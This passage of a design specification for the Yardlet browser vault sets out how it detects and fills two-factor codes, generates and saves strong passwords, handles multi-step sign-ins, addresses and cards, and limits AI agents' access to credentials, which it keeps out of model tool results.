  2. A field is something else when another `autocomplete` value marks it (`tel`, `cc-*`, `postal-code`, `username`,
     `email`, a password and so on), when its words name another code (postal, promo, coupon, gift, referral,
     captcha, recovery, backup and so on), or, unless they name a one-time code, another field (search, phone, email,
     user, card, birth year, name, address and so on). A field in a form with a card number or expiry field is the
     card's security code, which Chrome's `kCardCvcRe` also calls `security code` and `verification`.
  3. Its words are its name, id, placeholder, title, `aria-label`, `aria-labelledby` and `<label>` text, with camelCase
     split. Names of a one-time code (`otp`, `one-time`, `2fa`, `mfa`, `totp`, `verification code`, `verification pin`,
     `security code`, `approvals_code`, `login code`, `passcode`, two-step and two-factor, and in Korean, Japanese,
     Chinese, Spanish, Portuguese, French, German, Italian and Russian, such as 인증번호, 보안 코드, 確認コード and 验证码)
     mark a code field. A word alone such as `code`, `pin` or 코드 is weaker, and so is a label such as "Enter code" or
     "코드 입력". `verification pin` is a name of a one-time code because a field such as LinkedIn's
     (`input__phone_verification_pin`, labelled "코드 입력", named `pin`) would otherwise read as a phone field. "Verify
     PIN" is left out: a form that sets a PIN asks for it again under that name.
  4. The page asks for a code around the field when the nearest region holding no other field to type in (checkboxes,
     buttons and one-character boxes beside a one-character box do not count), within 4,000 characters of text, says
     a two-step, verification or one-time phrase and a code or digit word. This finds a field such as Instagram's
     two-step one, which carries no attribute of its own and only a label "코드", in a dialog headed "Two Step
     Verification" that asks for "6자리 코드".

  For filling, a field passes with any of: a name of a one-time code, a weaker word, a maximum length of 10 or less,
  numeric input, or a page asking for a code around it. For showing the bar, the check is narrower: a name of a
  one-time code, a numeric field (numeric input, tel or number) of at most 8 characters, or a page asking for a code
  around it, so a postal code, a birth year or a card's security code with numeric input offers no bar. The watcher reports a field once while that field is visible in a document.
- **At setup:** when the watcher script sees an image of QR size and shape on screen (a near-square `img`, `canvas` or
  `svg`, 96 to 640 CSS px), it reports it, and Yardlet captures that tab's screen with CDP `Page.captureScreenshot` and
  reads the QR with Vision (`VNDetectBarcodesRequest`). If it finds an `otpauth://totp/` address whose key is not yet in
  the vault, it shows the setup bar. The default target is the site's item whose username matches the QR's account;
  failing that, the site's only item; failing that, a new item for the site. With several items, [Save] saves to the
  default target, and the arrow beside it picks another item or "New Item". After saving, if the page has a code field
  (the field asking for the first code to finish setup), the new code is filled right away. The code bar does not show
  on a setup page (that field belongs to the new code). An `otpauth:` link on the page is taken through the same bar.
  An agent that fills the first code of a setup the vault does not hold gets the same bar for the person first (section
  20).
- **The path the person chooses:** the page right-click "Add Two-Factor Code from QR Code" reads the current screen. It
  also shows on pages that are not sites (image files). If nothing is found, it says "No two-factor QR code is on the
  screen." A key put off with "Not Now" is not asked about again while that tab is visible, but this menu reads it
  again.
- **Moving over:** Settings → Passwords "Import QR Code…" (several image files) and the right-click above read Google
  Authenticator's `otpauth-migration://` and create an item without site or password for each time-based account. The
  name is the issuer (or the account if there is none), and the username is the account. Keys already present are
  skipped, and counter-based (HOTP) and MD5 accounts are counted and reported. An imported image is a file that holds
  the secrets in the clear, so, as with CSV, Yardlet asks whether to move it to the Trash. CSV import reads the
  `OTPAuth` column of 1Password and the Apple Passwords app and Bitwarden's `login_totp` column, and also accepts rows
  with only a code and no password.
- **Settings:** Settings → Passwords has a "Two-factor codes" list with a row for each item that has a code (name,
  account or site, the code split into two groups, a ring showing the seconds left, copy). The item sheet has the same
  row, with Remove, which takes the code out of the item and its keychain secret when the sheet saves (Cancel keeps it),
  as Apple's Passwords app deletes an entry's verification code. An item that holds no password or passkey beside the
  code is deleted with Delete instead, and the row says so rather than saving an empty item. Copying adds
  `org.nspasteboard.ConcealedType` so clipboard history apps do not keep it. Viewing a code does not ask for Touch ID
  (the same level as the person's key button fill, and phone authenticator apps do not ask by default either). The
  keychain is read only while this list is visible.
- **Items without a site:** like an authenticator app's entries, they show and copy the code, and an import saves them
  without a site, since an issuer such as "Amazon Web Services" names no domain. A name names a site when the name, or
  its first word, is the own label of the site's registrable domain apart from case, spaces and punctuation (`Vercel`
  for `vercel.com`, `Amazon Web Services` for `signin.aws.amazon.com`, not `Vercel` for `vercel-login.com`). A code
  with no site gets one in three ways, and never from its name alone:
  - **From its account's sign-in, by itself:** as the vault opens and after codes or sign-ins are imported, a code with
    no site takes the sites of the one item with a password or passkey whose username is the code's (apart from case)
    and one of whose sites the code's name names: the "Instagram" code of `ada` takes `instagram.com` from the
    `www.instagram.com` sign-in of `ada`. It takes those saved sites of the sign-in, never a site made from the name.
    Nothing is linked when the code has no username, when two such sign-ins are found, when two codes would go to one
    sign-in, or when the account already has a code on those sites; those wait for the person.
  - **In Settings → Passwords, "Two-factor codes with no site":** each such code, with a suggested site the person
    checks or changes and links, one row or all at once. The suggestion is a site of a saved item the name names (the
    same account's first), else a site of an item saved under the code's name (without the account an import adds to a
    second code of one issuer), else the site of the latest page the code was asked for in the usage log. With none of
    these the field stays empty: a site guessed from the name alone (`parsec.com` for "Parsec", whose site is
    `parsec.app`) would send the code to whoever holds that name.
  - **From the code bar:** when a code field shows and none of the site's own items has a code, the code bar offers the
    codes with no site whose name names the page's site. The bar says the site it keeps ("Fill the two-factor code from
    “Vercel” and link it to vercel.com?"), and filling it saves that site in the item, as Bitwarden's "Autofill and
    save" and the 2FAS extension do. None of these guesses a site when codes are imported: the site is saved when the
    person picks the code on it.

  From then on it is the site's code for the code bar and the agent. A linked code stays an item of its own beside the
  sign-in rather than being merged into it as 1Password keeps a code in its login: the vault already keeps a site's
  password and code in two items (an imported code, a code saved from the setup bar into a new item) and each fill
  takes the item that has what it asks for, so linking needs no new path, loses nothing, and taking the site out in the
  item sheet undoes it. Merging would move a secret between keychain items, choose whose name and agent use win, and
  need a copy kept to undo it. Since the two items are one account's, an agent's fill naming either takes the site's
  one item of that username that has what is asked for: a login named after the "Instagram" code fills the
  `www.instagram.com` sign-in. An agent never fills a code with no site: its refusal (a `refused` failure, retry `no`,
  with `unlinkedCodes` and `site`) names the code and says the person can link it in the settings list or fill it once
  from the code bar, and asking for one by name is no phishing sign (section 6.3).

### 14.4 Rules shared with the vault

- Values do not go to the model: passwords and codes the person fills also go onto the matching-string scrubbing list
  (section 5.3) and are scrubbed from agent tool results for 30 minutes. The watcher script sends no values (only the
  fact that a code field or a QR is there, and the document address). The QR's secret is read only inside the Yardlet
  process.
- Fill only when the site matches: filling from the bars and the key button picks the item by the main frame origin the
  browser reports (`valuesForPerson`). The person may also choose any item from the key button's list for the page; a
  password goes to a site it is not saved for only after Touch ID (section 16).
- Secrets stay in the keychain. No settings or shortcuts of its own: two bars, one menu item, and a list and one button
  in Settings → Passwords; turning off the vault switch removes the bars and the menu item.
- Watching cost: while the page changes, it looks at input fields and images at most once every 0.5 seconds. Images
  already measured are not measured again, and QR checks are capped at 10 per document.

### 14.5 Security trade-offs

Keeping passwords and two-step verification keys together in the same vault on the same Mac makes the two factors one
for whoever opens that vault (or for a program running with Yardlet's signature). 1Password says "The convenience will
usually outweigh the fairly negligible amount of security that may be sacrificed.", while admitting that when the device
is fine and only the 1Password access details are stolen, a separate authenticator app protects more
([blog](https://1password.com/blog/1password-2fa-passwords-codes-together)). Apple only explains that the Passwords app
stores and encrypts one-time passwords together with passwords, and does not discuss this trade-off ([Passwords &
Privacy](https://images.apple.com/legal/privacy/data/en/passwords/)). The Yardlet vault has no sync, so there is no
account to be breached remotely; instead, the user session on this Mac is both factors. For accounts where that
trade-off is unwelcome, such as a bank, keep the key only in the phone authenticator app.

Offering a code with no site by its name compares only the label, not the public suffix, so `vercel.co` would be
offered the Vercel code too. That is no worse than before it was linked: a phone authenticator app shows its codes on
any site. The bar names the site it would save, the person decides, and only the site they filled it on is saved, which
then holds that item to the same site rule as any other (section 6.2). Agents keep to saved sites, so a look-alike page
cannot get a code while the person is away.

Linking a code by its account's sign-in adds no site the person did not save: the site is one the person saved a
sign-in for, and the code goes there only when its name names that site and its username is the sign-in's. A code is
linked to the wrong account only if a service's code and another service's sign-in share both a username and a name,
and then it goes only to a site the person signs in to anyway. The settings list's suggestions are saved only when the
person links them.

### 14.6 What it cannot replace

- **Push approval:** Microsoft Authenticator number matching
  ([Learn](https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-mfa-number-match)), Okta Verify push
  ([help](https://help.okta.com/en-us/content/topics/mobile/okta-verify-overview.htm)) and Google prompts
  ([help](https://support.google.com/accounts/answer/7026266?hl=en)) work by approving, in the registered phone app, a
  request the service sent to that app, so there is no shared secret. If the service also allows TOTP, register that
  method too and read its QR with Yardlet.
- **Text messages:** the service sends the code to the registered number, so there is no secret to store ([Google
  help](https://support.google.com/accounts/answer/185839?hl=en)).
- **Email codes:** the code bar does not read mail. An agent that can read the person's mail types such a code itself
  (section 19.2).

### 14.7 Moving over from an authenticator app

- **Google Authenticator:** on the phone, Menu → Transfer accounts → Export accounts → choose accounts → the QR appears.
  Photograph that screen with another device's camera, or take a screenshot, move it to the Mac and pick it in
  Settings → Passwords "Import QR Code…". If there are
  several, pick them all. If the image is open in the Yardlet browser, right-click "Add Two-Factor Code from QR Code"
  also works. After the import, move the image files to the Trash.
- **Apps without export, such as Microsoft Authenticator:** set up again, site by site. Sign in to the site in the
  Yardlet panel → two-step verification in the security settings → "set up a different authenticator app" (for a
  Microsoft account "Set up a different Authenticator app", for a work or school account "I want to use a different
  authenticator app",
  [help](https://support.microsoft.com/en-us/authenticator/how-to-add-your-accounts-to-microsoft-authenticator)) → when
  the QR appears, [Save] on the setup bar → Yardlet fills the first code the page asks for → confirm. Once the new key
  is registered, delete that entry from the old app (depending on the site, the old key stops working right away).
- **1Password, Bitwarden and the Apple Passwords app:** export to CSV, then Settings → Passwords "Import CSV…". The code
  column comes along.

## 15. Strong password suggestions

As Chrome and Safari do, when a password is made or changed, the vault makes a strong random one, offers it, fills it,
and keeps it.

`passwordrules` is Apple's proposal to the HTML standard: `required:`, `allowed:`, `max-consecutive:`, `minlength:` and
`maxlength:` rules separated by `;`, with the classes `upper`, `lower`, `digit`, `special` (ASCII punctuation and the
space), `ascii-printable`, `unicode` and custom ones in brackets, where `-` comes first and a `]` last, as in `[-abc]]`
([PasswordRulesParser.js](https://github.com/apple/password-manager-resources/blob/main/tools/PasswordRulesParser/PasswordRulesParser.js)).

### 15.2 Rules

- **When the bar shows:** when an empty new password field takes the focus, the panel shows a bar above the page, "Use a
  strong password for github.com? The password manager saves it. [Not Now] [Use Strong Password]" (the same shape as the
  save and code bars; section 8.3 says why there is no list under the field). A new password field is one marked
  `autocomplete="new-password"`; else, past a current password (marked `current-password` or named so in its name, id,
  placeholder or label), the form's other one or two; else both of a form's two password fields or the last two of three;
  else a lone field named new. Chrome offers automatically only with its server's predictions or the attribute, and
  Yardlet has no server, so its basic heuristics stand in, with the current password told apart by name. A lone password
  field is a sign-in's, so it gets no bar. The bar shows once per page.
- **The other path:** on any password field, right-click "Use Strong Password" (Chrome's "Generate password"). The
  person's click is the choice, so it fills at once.
- **The password:** Chrome's generator (15 characters, its three classes without look-alikes, at least one of each,
  shuffled), plus one of Chrome's symbols `-_.:!`, since many sites insist on a symbol and Yardlet has no list of each
  site's requirements as Chrome has. A site's `passwordrules` replace those classes (Safari and 1Password read them), and
  the field's `minlength` and `maxlength` bound the length. Each character comes from `SecRandomCopyBytes`, drawn 32 bits
  at a time and drawn again when past the last whole multiple of the range (no modulo bias), and the shuffle uses the
  same draws. As Chrome does, `--` and `__` are drawn again. If the random source fails, no password is made.
- **Saving (Chrome's presave):** the password is saved the moment it is filled, so a page that fails or submits on its
  own loses nothing. With no item for that username on the site, it is a new item (named after the site, with the
  username the form holds); submitting the form gives the item the username typed by then, without asking. Beside an
  item of the same username (a change form), the new item has no username, as Chrome's has, so the saved password stays
  the one filled; after the change is submitted, the save bar asks "Update the saved password of ada for github.com?", and
  updating gives the saved item the new password and deletes the item beside it. A form that shows no username (a change
  dialog, a recovery's new password page) leaves the new item without one; once it is sent, the bar asks to update the
  item a password sent with no username updates (below), and its menu offers the site's other items or keeps the new
  item as it is; a site with no other item asks nothing. Choosing again on the same page replaces the password in the
  same item.
- **A made password stays unless the page certainly took nothing:** Yardlet deletes the item made for it only when
  the fill put nothing in for sure: the page had moved to another document before the fill was sent, or the fill
  stopped before writing because the field was no password field or the page was on another origin. A fill the page
  did not answer (the call timed out, or the page's script broke off) may have put it in, so the item stays. When the
  fields holding a made password are emptied before the form is seen to be sent (the new password and its
  confirmation, by the person's or an agent's typing), Chrome deletes its presave (`PasswordNoLongerGenerated`);
  Yardlet keeps the item as it is and only logs it. Yardlet, unlike the site, cannot tell whether the site already took
  the password: a page may send its fields with its own script, and a person may empty a field the password went into
  by mistake while another still holds it. Losing a password the site took locks the person out of the account,
  while an item nobody used costs one deletion in Settings → Passwords, and in the meantime an agent's fill on that
  site names its item. Moving the password to the item's previous passwords was weighed and left out: in the very
  case it guards against, the key button would show the item without the password the site now has. Choosing a
  strong password again on the page puts a new one into the same item, the earlier one going to its previous
  passwords. Otherwise the item goes only when the person updates a saved item with its password from the bar, or
  deletes it.
- **A form the page sends itself:** a submit event, a click on a `button` or submit input, and Enter in a password field
  count as submitting. A page that sends a new password with its own script from a `[role=button]` (a dialog
  that changes it in place) counts as sending it when the person clicks or presses Enter or Space on one after the
  password, made or typed into a new password field, in the nearest region of the page that holds a filled password
  field, and then, within 30 seconds and before another click, that field is removed or hidden and no field shown holds
  the password. This follows Chrome's inference that a form which goes away after a request succeeded was sent
  (`CanInferFormSubmitted`); the watch runs in an isolated world and does not see the page's requests, so the person's
  click stands in for the request Chrome waits for.
  To keep wrong save prompts away: a button that says it cancels, closes, goes back, skips or is "not now" (in English
  or Korean) does not count, nor one before the password or marked `aria-disabled`; a field emptied but still shown, as
  after an error, does not count, nor a form redrawn with the password still in it; and a sign-in's lone password field
  is not watched this way. What follows is the same as for a submitted form: the username, the update bar, the save bar
  for a typed password. A click on a `button` or submit input counts at once, in a form or not (a dialog of a React
  design system sends from a formless `<button type=submit>`), unless it says it cancels, closes, goes back, skips or
  is "not now", or is marked `aria-disabled`. A field the page shows as text with its own "Show password" still counts as a password field, as in
  Chrome, so a password typed while shown is offered and never kept as one of the form's other fields.
- **A password sent with no username:** a reset or change dialog that names the account only in its heading,
  or a password-only step, updates the site's item Chrome would update: none when an item holds that password already
  (only new fields are offered then), else its item with no username, else its item used last. The bar names the item
  ("Update the saved password of “Console sign-in” for …"), and when the site has more than one item its arrow lists
  them to update another instead, or saves a new item, as Chrome's update bubble lists the site's saved usernames. The
  item updated keeps the password it had among its previous passwords.
- **Previous passwords:** whenever an item's password is replaced (the update bar, the item sheet, a made password), the
  old one stays in the item, the last five with when each was replaced (Bitwarden keeps five). The item sheet shows them
  after Touch ID. So a change the site refused, then updated by mistake, loses nothing.
- **No generator history:** 1Password and Bitwarden keep every generated password in a history. The presave already
  keeps each filled one in an item the person sees, so there is no second list.

### 15.3 Agents

`browser_fill_credential` takes `kind: new_password` with `ref` on a sign-up form's password field. Yardlet reads the
field's `passwordrules`, `minlength` and `maxlength` and the username the form holds, makes the password, saves it as a
new item (named after the site, or `item`) before the page takes it, and fills it and its confirmation. The result says
only which fields were filled and the item's name and username. It goes the way of a saved password's fill (sections
5.2 and 5.3): only into a form that sends it to the site over https; onto the scrubbing list, the tab's record and the
address guard before it goes in; submitted only when the form is safe; and the usage log has the fill.

- **Only new accounts:** when an item of the form's username or of the name in `item` is already saved for the site,
  the call is refused and says to hand the tab to the person. Yardlet cannot tell whether a site took a change, and the
  person's update after it is the step that makes a new password the item's; an agent changing a saved password could
  lock the person out of an account they use.
- **Confirmation step:** a new item has no step yet, and new items default to "Always" (section 6.1), so the fill does
  not ask, except on a page where the agent ran its own scripts, where the person confirms first as for every fill
  (section 5.3). The harness's tool approval sits above it as for every fill. The tool is offered as always: with the
  vault on and holding an item.
- **Why account creation is in scope (section 3):** Codex `browserAuth` leaves it out, but it is a path where the
  model would otherwise type a password it chose, which then sits in the conversation history. Yardlet making it keeps
  the value out of the model's hands, which is the vault's purpose. It is part of the vault, so turning the vault off
  removes it with the rest, and nothing else is written anywhere.

### 15.4 Rules shared with the vault

- A made password is a vault value from the first moment, whoever asked for it: it goes onto the scrubbing list, the
  tab's record of filled documents and the address guard before the page takes it, so the agent's snapshots, scripts
  and screenshots on that document are refused as for any filled one (section 5.3), and the bar never holds or shows
  it. The watch tells Yardlet that a form with a made password was submitted without sending the value (`made`), since
  Yardlet has it already. No clipboard, no tool result, and no value in any log. Copying a previous password out of the
  item sheet marks the copy as concealed and clears it, as the sheet's other secrets.
- What becomes of a made password is in the usage log (section 6.3), without the value, so that one missing later can
  be traced: kept in a new item or in the page's earlier one, a fill the page did not answer, its fields emptied, the
  form sent (and whether the item took a username or the bar asked to update an item), updated into a saved item, and
  its item deleted with why. These entries have the kind `new_password`, the result `saved` or
  `deleted`, the task whose panel or agent made it, and a reason; the item sheet's "Recent use" keeps to fills and
  refusals.
- The site comes from the browser's main frame origin, as for every fill; only https sites and local development
  origins get an item.
- No settings or shortcuts of its own: one bar, one menu item, and the previous passwords row in the item sheet.
  Turning the vault off removes the bar, the menu item and the tool's kind.

## 16. Finding and picking an item

Filling a password or a two-factor code does not send the person to Settings → Passwords when the vault does not fill
on its own: the person gets a way to any item from the page, and the lists can be searched. Agents keep their rules.

### 16.2 Rules

- **Settings → Passwords:** a search field under the switch narrows the codes, the codes with no site and the items
  (section 8.1). A word matches a name, a username or a site, apart from case and accents; every word must match
  (`VaultItem.matches`).
- **The key button:** it shows on every site's page while the vault holds an item, not only where the site has one, so
  that a site with nothing saved still leads to the list. It opens a list under the address
  field, as 1Password's and Bitwarden's toolbar buttons open theirs: the search field takes the keyboard, the site's own
  items come first, and a search adds every other item it finds (each with its first site and how many more, or "No
  site"). Arrow keys move through the rows, Return chooses one. The list is drawn by Yardlet, not the page, and is
  never in a tool: an agent still names an item and gets a refusal it can act on (section 5.1).
- **What the list holds at a field:** a site can hold many items of different kinds (a cloud console's root user, IAM
  users of several accounts, their two-factor codes and a shopping account under one registrable domain), so the list
  keeps to what the field takes. As the list opens, the panel reads the field a fill would go to
  (`VaultPageScripts.personFieldKind`, the focused field, else the page's first password, username or code field): a
  field that looks like a code field (the code bar's rule, section 14.3) lists only the items with a code ("Two-factor
  codes for …"); a password field, a username or email field, or another field of a form with a password field (an AWS
  account ID) lists only the sign-ins, with a password or passkey ("Passwords for …"). A page with no field, or a field
  that says neither, lists every item, and so does a page that does not answer within half a second. The
  code bar's "Choose Another Code…" lists codes. Search keeps to the same kind. From a list of codes a choice fills the
  code alone.
- **A row:** as Chrome's list at a field, the account first: the username, or the item's name when it has
  none. Beside it, what choosing it fills ("Password", "Passkey", "Verification code"; where the field says neither,
  everything the item holds), and a symbol for it. Below, what tells it apart from the site's other rows: its other
  fields' values (an AWS account ID, section 17), then its name, which for an item saved from a page is the host it was
  saved from (`signin.aws.amazon.com` beside `amazon.com`), or "No username". The code bar's menu names its codes the
  same way. Yardlet keeps no notes; the name is the person's to change in the item sheet.
- **Order:** the site's rows come as Chrome orders a site's sign-ins: the item used last first, the rest by
  account and then name. The item filled on a sign-in's earlier step still comes before them (section 17). A fill by
  the person counts as a use, as an agent's does, so the item the person used last is the one first next time.
- **What a choice fills:** a code with no password fills the page's code field with its current code, and is copied
  when the page has none (marked concealed and cleared after 90 seconds, as Settings → Passwords copies one; section
  5.3). Any other item fills the sign-in into the form, or the code when the focus is in a code field. A
  sign-in with no code of its own gives the code of the page's one other item of its account (the same username apart
  from case), as an agent's fill does (section 14.3); with no such item, or two, it gives none.
- **Another site's item:** a password goes to a site it is not saved for only after Touch ID, whose prompt names the
  item and the page's site ("fill “GitHub” on example.com, which is not one of its sites"), as Chrome confirms first and
  Bitwarden warns first. Showing a password in the item sheet already asks for Touch ID, and filling it into another
  site hands it to that site. A code asks for nothing, as copying it from Settings does not. Once the item filled, the
  bar offers the site ("Also save example.com in “GitHub”?", or "Save example.com as the site of “Fabrikam”?" for a code
  with no site), as Bitwarden's "Autofill and save this site"; saving keeps the page's registrable domain in the item
  beside its others (`VaultCenter.link`), and from then on the site's own list, code bar and agents' fills take it. The
  bar stays while the page is on that site, since a filled code often sends the page on at once.
- **The code bar:** one code fills at once, and its arrow has "Choose Another Code…"; with several codes the
  menu lists them, account first, and ends in the same item. It opens the key button's list keeping to items with a
  code.
- **Several items on one site:** the person chooses from the list. An agent's fill names one item or lets the page
  point to one (sections 5.1 and 19.2); the list is never offered to it.

### 16.3 Rules shared with the vault

- The values take the path of every person's fill (sections 5.3 and 14.4): onto the scrubbing list, the tab's record of
  filled documents and, for a password, the address guard before they go in. A copied code goes onto the scrubbing list
  as well.
- An agent's fill keeps to an item's saved sites. A site saved from the bar is a site the person chose to fill on, so it
  is then the item's like any other; the item's agent use decides whether agents fill it there unasked (section 6.1).
- The site comes from the browser's main frame origin, as for every fill; the bar offers only an https site's
  registrable domain or a local development origin.
- No settings or shortcuts of its own: a search field, the list under the key button, one bar and one menu item.
  Turning the vault off hides the key button, its list and the bars.

### 16.4 Security trade-offs

Showing the key button's list on any page lets a look-alike page get a password only when the person chooses it there
and confirms with Touch ID, whose prompt names the page's site; Yardlet cannot tell a site the person signs in to on
another domain from a phishing one. A code goes to such a page without Touch ID, as it can be copied there anyway; a
relayed code works for the attacker only within its 30 seconds, and the agents' fills stay bound to saved sites.

## 17. Sign-ins in steps and fields beside the username

Some sign-ins ask for the username on one page and the password on the next (AWS's root user, Google, Microsoft,
Apple), and some forms hold an account beside the username (AWS's IAM user sign-in: account ID or alias, IAM user name,
password). The vault keeps the earlier step's username and the form's other fields, so such sign-ins save with their
account and one IAM user name in two accounts stays two items.

### 17.2 Rules

- **A username-first sign-in:** the watch tells Yardlet when the person sends a step that asks for the username alone
  (one field they typed, marked or named as a username or email, and no password field shown). The panel keeps it for
  that tab and site (the registrable domain) for five minutes, as Chrome does (Bitwarden keeps one minute; a two-factor
  step can come between). A password step whose form gives no username takes it for the save bar; a field marked
  `autocomplete="username"` on the password step, also a hidden one, comes first. It stays in memory, in that tab.
- **Filling in steps:** the item the person fills from the key button on the first step is kept the same way, and the
  key button's list on the next step of that site in that tab lists it first, so Return fills its password. Yardlet
  does not fill the next step by itself: the person's fills go through the key button (section 8.3), and Chrome also
  waits on the username page.
- **Fields beside the username:** when a sign-in is sent, the form's other text fields that hold a value (typed by the
  person, or filled in by the page or the vault) go with it, as 1Password keeps a login's other fields: each with its
  `id`, `name` and label and its value. Never a password, a code, a captcha, a card's field or one marked otherwise
  (`cc-*`, `one-time-code`, `username`, `email`); at most three, each up to 200 characters. The item keeps them when the
  person saves or updates, in `items.json` with the username, since they are no secrets and the list shows them. A fill
  puts each into the page's empty field of the same id, name or label (Bitwarden's matching), for the person and the
  agent alike, and leaves a field the page filled already (an AWS sign-in address names its account).
- **Telling accounts apart:** an item's account is its username and then its other fields' values (`dev ·
  111122223333`). The settings list shows it beside the name, the key button's list as the row's username with the
  other fields' values under it (section 16), the update bar names it ("Update the saved password of dev ·
  111122223333 for signin.aws?"), and an agent's refusal lists it. A sign-in is an item's when the username is the
  same and none of the item's fields holds another value for a field the form had, so one IAM user name in two
  accounts saves two items. An agent names one by its name, its username or another of its values, such as the
  account ID.
- **Items saved without a username:** Yardlet changes none of them by itself. When a sign-in with a username uses the
  password of an item that has none, the bar asks "Add dev to the saved password for signin.aws?", and Save gives the
  item the username and the form's other fields; an item that lacks only a field the form had is asked the same way.
- **AWS's domains:** sites follow the registrable domain here too. The Public Suffix List has `aws` as a top-level
  domain, so `ap-northeast-1.signin.aws` belongs to `signin.aws`, while `signin.aws.amazon.com`, its regional hosts and
  `console.aws.amazon.com` belong to `amazon.com`, as Amazon's shopping site does. An item saved on an AWS page is
  therefore for `amazon.com` or `signin.aws`: it is offered on Amazon's shopping site too, and an AWS item saved for one
  is not offered on the other. The person can list both `signin.aws.amazon.com` and `signin.aws` in an item's sites.
  Joining the two domains would need a list of Yardlet's own, since no public list (Apple's password-manager-resources
  included) joins them, and the vault keeps no such list.
- **The item sheet:** each kept field shows under the page's own label as a text field, and emptying it removes it.
- **Closing the bar:** the save bar closes with an X at its end, as Chrome's save bubble and the panel's permission bar
  do; closing remembers nothing, while "Not for This Site" stops offers for the site. Nothing in Settings.

### 17.3 Rules shared with the vault

- What the watch sends Yardlet of a submission includes the other fields' values, which are no secrets. A step's
  username is kept in memory, for one tab and site, five minutes.
- The site and the agent rules stay those of section 5: other fields go only into the page's own fields, with the
  username and password they belong to, and only into an empty one.
- Turning the vault off stops all of it; the fields live in the item and go with it.
- A field the vault filled counts as the person's once they type another password into it, so correcting a filled
  password that a site no longer takes offers to update the item, as typing one in any other field does.

## 18. Addresses and payment cards for the person

The browser panel saves and fills addresses and cards for the person, as Chrome and Safari do. Cards are the person's
alone: no agent tool gives or fills one, and what an agent can read of a page after a card goes in follows the
filled-document rules of section 5.3.

### 18.2 Rules

- **Where:** Settings → Passwords has an "Addresses and cards" section: a switch ("Save and fill addresses and cards",
  on by default as in Chrome and Safari, in a team-signed build), the saved addresses (the name, then the street, city
  and postal code) and cards (the nickname or network and the last four digits, then the expiry and the name), adding
  and editing one in a sheet, and "Delete All Addresses and Cards…". They are one keychain item of the vault's service
  (account `wallet`), apart from the passwords' items: "Delete all passwords…" leaves it, its own Delete All removes the
  keychain item. Turning the switch off stops every bar and fill and keeps what is saved, as Chrome's and the vault's
  own switch do; nothing else is written anywhere.
- **Saving:** when the person sends a form, a card form (a card number field) holding a number that passes the Luhn
  check and an expiry month and year is offered for saving ("Save the card Visa •••• 4242?"), as Chrome asks; a saved
  card whose expiry or name changed is offered for updating. An address form (a street and two more address fields)
  holding a street and a city or postal code is offered ("Save the address …?") unless the same one is saved. The bar
  closes with its X. A card the vault filled is not offered again.
- **No security code:** Yardlet does not keep it, unlike Chrome by default, Safari, 1Password and Bitwarden. The code
  is what a site asks for to know the card is at hand: kept beside the number, a copy of the keychain item would be
  the whole card. Typing three or four digits at each payment is the cost. The fill leaves the code field empty.
- **Filling:** when an empty field of a card or address form takes the focus, a bar offers the saved one ("Fill the
  card Visa •••• 4242?") or, with several, a Fill menu; "Not Now" ends it for the page. A card fills only after Touch ID
  or the login password (Safari's way; Chrome's step is off by default on macOS); an address fills without asking, as
  in Chrome. A fill puts each value into the empty field of its kind in the focused field's form (a select takes the
  option of that value or text; an expiry takes `MM/YY`, `MMYY` or `MM/YYYY` as the field asks).
- **Telling fields:** the field's `autocomplete` token (past `section-*`, `shipping`, `billing` and the like; `off`
  is not read, as Chrome does not), else its name, id, labels and placeholder against English and Korean patterns, as
  Chrome's and Bitwarden's are. Card fields inside another site's frame (a payment provider's) are not filled: the
  vault fills only the page's own fields (section 5.2).
- **For agents:** no tool gives an address or a card, and no agent fill uses one. A card's number and expiry go onto
  the scrubbing list and the number onto the address guard before they go in; the document is recorded as filled, so
  the agent's scripts and screenshots are refused there and its snapshot leaves out the filled fields (section 5.3). A
  card number, expiry or code the person types in closes the page to the agent's scripts the same way, as a typed
  password does.

### 18.3 Rules shared with the vault

- Card values never reach a tool result, a log or the clipboard; the bars and Settings show a card by its last four
  digits, and its sheet shows the number only as "Unchanged" until the person types another.
- The site and origin rules of section 5.2 hold: a fill goes only into the main frame's document of the origin it
  was given for.
- With the switch off, the panel takes nothing from what the watch reports of address and card fields: no bar, no
  fill, nothing kept.

## 19. Agents sign in by themselves

Agents sign in to saved accounts by themselves rather than wait for the person: Yardlet tells them where a sign-in goes,
picks the item when the page points to one, and makes each refusal say what to do next.

### 19.2 Rules

- **Context where the agent reads it:** Claude Code lists an MCP server's tools by name until the model loads one, so
  a tool's description alone may go unread. The server's instructions, which harnesses show whole, say
  that a page asking to sign in or for a two-factor code goes to `browser_fill_credential` first when the task has it,
  even when the site may ask for another step after; that a code in mail or texts the agent can read is its to type; and
  that `browser_handoff` is for what is the person's (nothing saved, a passkey on their phone or Touch ID, a CAPTCHA, a
  payment, a choice of theirs). The handoff tool's description and the fill tool's say the same in a sentence.
- **Choosing among several:** a fill that names no item, on a site with several items that have what `kind` asks for,
  takes the first rule that leaves exactly one: the item whose username the form's username or email field holds
  (hidden ones too: a password step keeps the account of the step before), the one whose username the page's text
  shows whole, the item this task filled on this host last or another item of its account (a code after its sign-in),
  and the one item saved on this very host (its name or a site entry is the host). Chrome's password manager fills a
  site's best match the same way: an exact match before a same-domain one, the one used last among them. When no rule
  leaves one, the refusal lists the items ("name (username)"). The result names the item taken, its account and the rule, so the
  agent can name another. The page's field values and text are read only on a site with several items, in Yardlet's
  isolated world, and stay in the Yardlet process.
- **A passkey asked of a site with none:** the refusal names the site's items that have a password, and whether a code
  is saved, and tells the agent to choose the page's other way to sign in and fill the password with kind `login`, then
  the code.
- **Nothing saved:** the refusal adds that a page signing in through another site's account may have that site's item
  saved, and that otherwise the agent hands the tab to the person, whose typed password the save bar offers to keep.
- **No joined sites:** a fill matches only the tab's main frame origin against the item's sites (section 6.2); Yardlet
  does not join sites through Apple's password-manager-resources lists or the tab's redirect chain.

### 19.3 Rules shared with the vault

- No value reaches the agent; a result names the item, never a value. A choice is only among the site's own items
  (section 6.2), and the item's policy still decides whether the person is asked. The scripts rule and the rules for a
  filled document hold as for every fill.
- No setting, bar, menu item or shortcut of its own.

## 20. Two-factor setups an agent finds

When an agent turns on two-step verification for an account (a new cloud console user, an authenticator added beside a
phone prompt), the vault can keep the setup so that later sign-ins need no phone. Before an agent's setup is saved, the
person is asked once, with the setup bar; Save keeps it and fills the first code, Not Now keeps nothing, and the agent
never sees the key.

### 20.1 Rules

- **When:** an agent calls `browser_fill_credential` with `kind: one_time_code` on a page that shows a two-factor setup
  the vault does not hold: an `otpauth://` link, else a QR code that a graphic of a QR code's size and shape on screen
